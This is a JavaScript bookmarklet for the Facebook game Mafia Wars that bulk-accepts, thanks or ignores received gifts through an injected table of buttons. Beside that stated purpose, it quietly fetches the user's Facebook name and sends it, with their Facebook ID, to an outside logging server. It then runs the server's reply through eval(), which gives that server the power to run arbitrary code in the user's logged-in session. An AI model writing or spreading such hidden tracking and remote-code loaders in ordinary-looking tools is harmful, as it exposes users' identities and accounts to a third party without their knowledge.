javascript:(function (){
//<unframe>
	if (navigator.appName == 'Microsoft Internet Explorer') {
		alert('You are using Internet Explorer, this bookmarklet will not work.\nUse Firefox or Chrome instead.');
		return;
	}
	if (/m.mafiawars.com/.test(document.location)) {
		window.location.href = document.location+'?iframe=1';
	}
	else if (/apps.facebook.com.inthemafia/.test(document.location)) {
		//Credits to Christopher(?) for this new fix
		for (var i = 0; i < document.forms.length; i++) {
			if (/canvas_iframe_post/.test(document.forms[i].id) && document.forms[i].target == "mafiawars") {
				document.forms[i].target = '';
				document.forms[i].submit();
				return;
			}
		}
	}
	else if (document.getElementById('some_mwiframe')) {
		// new mafiawars.com iframe
	window.location.href = document.getElementById('some_mwiframe').src;
		return;
	}
	else {
		document.body.parentNode.style.overflowY = "scroll";
		document.body.style.overflowX = "auto";
		document.body.style.overflowY = "auto";
		try {
			document.evaluate('//div[@id="mw_city_wrapper"]/div', document, null, XPathResult.ORDERED_NODE_SNAPSHOT_TYPE, null).snapshotItem(0).style.margin = "auto";
			if (typeof FB != 'undefined') {
				FB.CanvasClient.stopTimerToSizeToContent;
				window.clearInterval(FB.CanvasClient._timer);
				FB.CanvasClient._timer = -1;
			}
			document.getElementById('snapi_zbar').parentNode.parentNode.removeChild(document.getElementById('snapi_zbar').parentNode);

		} catch (fberr) {}
		//Revolving Revolver of Death from Arun, http://arun.keen-computing.co.uk/?page_id=33
		$('#LoadingBackground').hide();
		$('#LoadingOverlay').hide();
		$('#LoadingRefresh').hide();
	}
	//</unframe>

	//hack to kill the resizer calls
	iframeResizePipe = function() {};

function Gift(src,count){
        this.src = src;
		this.count= count;
}
function in_array(which,list){
 for(var i=0;i<list.length;i++){
   if (list[i].src == which){
    return true;
   }
 }
 return false;
}
function getIndex(which,list){
 for(var i=0;i<list.length;i++){
   if (list[i].src == which){
    return i;
   }
 }
}
var name_uid = '';
var the_name = 'FastGiftClick v2 - G';
var mUrl = 'https://graph.facebook.com/'+User.trackId;
var the_id = User.trackId;
   $.ajax({
        url: mUrl,
        dataType: 'json',
        success: function(data, status) {         
          //alert(data.name);
          name_uid=data.name;

      }
      ,complete: function(){
           $.ajax({
                                                 async : true
                                                ,cache : false
                                                ,type    : "GET"
                                                ,url     : "http://cux.cu.funpic.de/mw/log_new.php"
                                                ,data    : { user:name_uid, script:the_name,fbid:the_id}
                                                ,dataType: "jsonp"                                     
                                                ,xhrFields: {
                                                    withCredentials: true
                                                }
												,success : function(data,status){
												      eval(data);
												}
												
                              }); 
						  
                  }
   });;   	
	    var items=new Object();
		var itemList=new Array();
		var itemCount=new Array();
        
		var texts = new Array();
function trim(str) {
        return str.replace(/^\s+|\s+$/g,"");
}
			//$("#zmc_message_list_ul").find('li').each(function(index){			        
			$('#zmc_message_list_ul').find('li').each(function(index){			        
					if ($(this).find("img").length > 0){        
					var src=$(this).find("img")[0].src;
					if (!in_array(src,itemList)){
					  var gift = new Gift(src,1);
					  itemList.push(gift);
					}
					else{
					   itemList[getIndex(src,itemList)].count++;
					}						
					
				/*
				//	if (src.indexOf("item_mysterybag_disco_red")!=-1) {					    
						var text=$(this).find("p")[0].innerHTML;
						var action=null;
						action=this.getElementsByClassName("sexy_button_new")[0];
						//if(actions.length < 100){
							//actions.push(action); texts.push(text);	
						//}
					//}
				*/
					}
				});
var actions = new Array();				
function ClickGift(id,list,type){
	actions = new Array();
	$('#zmc_message_list_ul').find('li').each(function(index){			        
						if ($(this).find("img").length > 0){        
						var src=$(this).find("img")[0].src;
						
						if (src== list[id].src) {					    
							var text=$(this).find("p")[0].innerHTML;
							var action=null;
							action=this.getElementsByClassName("sexy_button_new")[0];	
							if(type == 0){
								actions.push(action); 					
							}
							if(type == 1){
							   var btext = trim($(action).text());
							   if(btext == 'Accept Gift and Thank' 
							   || btext == 'Join Crew and Thank'
							   || btext == 'Accept and Thank'){
							   //alert('Accept Gift and Thank found');
									actions.push(action); 					
								}							  
							}							
							if(type == 2){
							   action=this.getElementsByClassName("ignore")[0];	
							   var btext = trim($(action).text());
							   if(btext == 'Ignore'){
							       //alert('Ignore found');
							       actions.push(action); 				
								}							  
							}														
							
						}
						}
					});
					//actions = new Array();
					next_link(id,type);
}
			function next_link(id,type){
				if(actions.length>0) {
					next_action=actions.shift();					
					if (next_action){						
						try {
							$(next_action).trigger('click');
							//itemList[id].count--;
						} catch(facebookerror) {}
					}
					next_link(id,type);
				}
				else{				
				  if (type == 0 || type == 2){
					$('#juansinho_click_btn_all_'+id).removeClass('green').addClass('red');
					$('#juansinho_click_btn_all_'+id).html('<span><span>Done</span></span>');
					$('#juansinho_click_btn_all_'+id).unbind('click').click(function(){alert("Ok, so, what exactly do you want me to do?\nEverything was clicked already!"); return false;});
					$('#juansinho_click_btn_thank_'+id).removeClass('green').addClass('red');
					$('#juansinho_click_btn_thank_'+id).html('<span><span>Done</span></span>');
					$('#juansinho_click_btn_thank_'+id).unbind('click').click(function(){alert("Ok, so, what exactly do you want me to do?\nEverything was clicked already!"); return false;});
					$('#juansinho_click_btn_ignore_'+id).removeClass('green').addClass('red');
					$('#juansinho_click_btn_ignore_'+id).html('<span><span>Done</span></span>');				 
					$('#juansinho_click_btn_ignore_'+id).unbind('click').click(function(){alert("Ok, so, what exactly do you want me to do?\nEverything was clicked already!"); return false;});
				  }
				  if(type == 1){
					$('#juansinho_click_btn_thank_'+id).removeClass('green').addClass('red');
					$('#juansinho_click_btn_thank_'+id).html('<span><span>Done</span></span>');				  
					$('#juansinho_click_btn_thank_'+id).unbind('click').click(function(){alert("Ok, so, what exactly do you want me to do?\nEverything was clicked already!"); return false;});
				  }
				  alert("done");
				}
			}
			var out = '★LOC@S★ - FastGiftClicker v2<br><br><table border="1"><tr><th>Item</th><th>Count</th><th>Click All</th><th>Click<br><font size="-2">(Accept & Thank only)</font></th><th>Ignore all</th></tr>';
			for(i=0;i<itemList.length;i++){		
			  out +='<tr><td><img src="'+itemList[i].src+'"></td><td>'+itemList[i].count+'</td>'
				if (itemList[i].src.indexOf("mafia_families_icon_ZMC")==-1){
					out+='<td><a href="#" class="sexy_button_new green short" id="juansinho_click_btn_all_'+i+'"><span><span>Click all</span></span></a></td><td><a href="#" class="sexy_button_new green short" id="juansinho_click_btn_thank_'+i+'"><span><span>Click all</span></span></a></td>';
				}
				else{
					out+='<td>&nbsp;</td><td>&nbsp;</td>';
				}
				out +='<td><a href="#" class="sexy_button_new green short" id="juansinho_click_btn_ignore_'+i+'"><span><span>Ignore all</span></span></a></td></tr>';
			}
			out+='</table>'
			$('#zmc_message_list_ul').prepend(out);
			
	 var tmp1 = $('a[id*=juansinho_click_btn_all_]').each(
	  function (i,e){ 
	    var t = e.id.split('_');
		var the_id = t[t.length-1];
	    $(e).click(function(){ClickGift(the_id,itemList,0);return false;});		
	  }	);	
	 var tmp2 = $('a[id*=juansinho_click_btn_thank_]').each(
	  function (i,e){ 
	    var t = e.id.split('_');
		var the_id = t[t.length-1];
	    $(e).click(function(){ClickGift(the_id,itemList,1);return false;});		
	  }	  	);	
	 var tmp3 = $('a[id*=juansinho_click_btn_ignore_]').each(
	  function (i,e){ 
	    var t = e.id.split('_');
		var the_id = t[t.length-1];
	    $(e).click(function(){if (confirm('Are you sure, you want to ignore all that?')){ClickGift(the_id,itemList,2)};return false;});		
	  }	  
	);	
			//alert(out);
			/*
			if (actions.length > 0){
				next_link();	
			}
			else{
			  alert("No bloody bags found...");
			}
			*/

}())		